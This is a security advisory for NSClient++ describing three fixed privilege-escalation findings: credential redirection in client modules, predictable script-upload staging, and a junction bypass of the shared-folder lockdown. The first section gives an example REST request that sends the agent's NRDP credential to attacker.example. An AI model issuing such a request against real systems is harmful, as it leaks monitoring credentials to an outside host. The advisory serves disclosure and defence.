---
title: "Client credentials stay with their target, private script-upload staging, and a junction-proof shared folder"
fixed_in: next
severity: "Medium"
modules: [NRDPClient, IcingaClient, SMTPClient, NSCAClient, NSCANgClient, NSCPClient, WEBServer, packaging, core]
action: conditional
---
Three findings from a review of the whole tree. None is reachable by an
unauthenticated peer on a default install; each lets one privilege tier act as
the tier above it.

#### Client credentials could be sent to a caller-chosen host

The shared client parser loads the module's `default` target — `password` or
`token` included — and then applies the request's arguments on top, where
`host=`, `port=` and `address=` move the destination while the credential stays
behind. Any principal allowed to run a client module's `submit_*` / `check_*`
command could therefore have the agent send the configured credential wherever
it liked:

```
GET /api/v1/queries/submit_nrdp/commands/execute?address=http://attacker.example/nrdp/&command=x&result=0&message=x
```

Both seeded REST roles carry `queries.execute` and the core permission policy
is off by default, so a checks-only REST user was enough; over NRPE it needed
the non-default `allow arguments = true`. The affected modules are the ones
whose targets carry a credential: NSCA, NSCA-NG, NRDP, Icinga, SMTP and NSCP.

A request that moves the destination away from the target's configured address
is now refused when the credential that would travel is the target's own. A
target with no credential, a request supplying its own `password=` / `token=`,
and a request that does not move the destination are all unaffected. The
comparison is on the resolved address, so a header host entry counts too, and
`allow host override = true` restores the old behaviour per target.

#### Script uploads were staged at a predictable path

`PUT /api/v2/scripts/…` (admin only) wrote the body to `${temp}/<name>` —
`/tmp`, or `C:\Windows\Temp` for a SYSTEM service — with an unchecked
truncating write, then imported it as a command. A local user who created that
file first won a race against the copy, or won outright where the service's
overwrite was refused and the failure ignored. Stock DEB/RPM installs were not
exploitable: the service runs as `nsclient` and the script root is root-owned.
Uploads now go to a randomly named file, created exclusively and owner-only,
with every write checked and the file removed after import.

#### A junction defeated the modern-layout folder lockdown

Opt-in `LAYOUT=modern` only. The `%ProgramData%\NSClient++` lockdown was
path-based, so a junction planted by a standard user before install had the
owner and DACL applied to its *target* while the link stayed theirs to remove
and replace — with a crafted `nsclient.ini` the service then loaded as SYSTEM.
Reparse points are refused now, and ownership and DACL are applied through a
handle opened on the entry itself, so a junction fails the install, the
migration and service start.

**What to do:** mostly nothing. A request that moves a credentialed target's
destination without supplying the credential now fails — pass it with the
request, select another target with `target=` (which, as part of this change,
works for queries and not just exec), or set `allow host override = true`. On
the modern layout, replace a junction at the shared folder with a real
directory, or relocate the folder with a `[paths]` override in `boot.ini`.
